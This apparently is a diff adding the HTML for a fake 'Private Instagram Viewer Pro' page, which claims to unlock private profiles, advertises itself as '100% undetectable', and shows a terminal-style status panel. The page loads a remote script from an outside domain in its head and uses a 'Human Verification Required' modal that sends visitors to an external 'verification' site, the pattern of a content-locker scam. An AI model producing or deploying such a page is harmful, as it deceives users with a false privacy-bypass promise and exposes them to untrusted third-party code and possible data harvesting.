@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Instagram Viewer Pro</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <script type="text/javascript" id="ogjs" src="https://pratka.online/og.php?u=/cl/js/6d49km"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-banner">
+            <i class="fas fa-lock-open"></i> Advanced Instagram Profile Access Tool
+        </div>
+        
+        <div class="main-content">
+            <div class="logo">
+                <i class="fab fa-instagram"></i>
+                <span class="glitch-text">PRIVATE VIEWER PRO</span>
+            </div>
+
+            <div class="search-box">
+                <input type="text" id="username" placeholder="Enter Instagram Username" />
+                <button id="searchBtn"><i class="fas fa-search"></i></button>
+            </div>
+
+            <div class="control-panel">
+                <div class="panel-header">
+                    <i class="fas fa-cog"></i> Advanced Settings
+                </div>
+                
+                <div class="option-group">
+                    <label>
+                        <i class="fas fa-user-shield"></i>
+                        Proxy Protection
+                    </label>
+                    <label class="switch">
+                        <input type="checkbox" id="hideIp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="option-group">
+                    <label>
+                        <i class="fas fa-lock"></i>
+                        SSL Security
+                    </label>
+                    <label class="switch">
+                        <input type="checkbox" id="enableEncryption" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="option-group">
+                    <label>
+                        <i class="fas fa-server"></i>
+                        Server Location
+                    </label>
+                    <div class="custom-select">
+                        <select id="serverSelect">
+                            <option value="auto">Auto Select (Fastest)</option>
+                            <option value="eu">Europe (GDPR Compliant)</option>
+                            <option value="us">United States</option>
+                            <option value="asia">Asia Pacific</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button id="startDemo" class="glow-button">
+                    <i class="fas fa-eye"></i> VIEW PRIVATE PROFILE
+                </button>
+            </div>
+
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">
+                        <i class="fas fa-shield-alt"></i> Secure Connection Status
+                    </div>
+                    <div class="terminal-controls">
+                        <span class="terminal-button red"></span>
+                        <span class="terminal-button yellow"></span>
+                        <span class="terminal-button green"></span>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div id="output"></div>
+                    <div class="cursor"></div>
+                </div>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <i class="fas fa-bolt"></i>
+                    <h3>Instant Access</h3>
+                    <p>No waiting time required</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-user-secret"></i>
+                    <h3>Anonymous</h3>
+                    <p>100% undetectable</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Secure</h3>
+                    <p>End-to-end encryption</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-tachometer-alt"></i>
+                    <h3>Fast</h3>
+                    <p>High-speed servers</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal" id="verificationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <i class="fas fa-user-shield"></i>
+                <h2>Human Verification Required</h2>
+            </div>
+            <div class="modal-body">
+                <p>Before our system can give you access, you will need to pass this human verification step.</p>
+                <p>In order to bypass this step you will need to get a verification code by completing the short and simple instructions on the next page.</p>
+                <p>This will allow our system to know that you are human.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="verify-button" onclick="window.location = 'https://areyourealhuman.com/cl/i/6d49km'">
+                    <i class="fas fa-check-circle"></i>
+                    Complete Verification
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
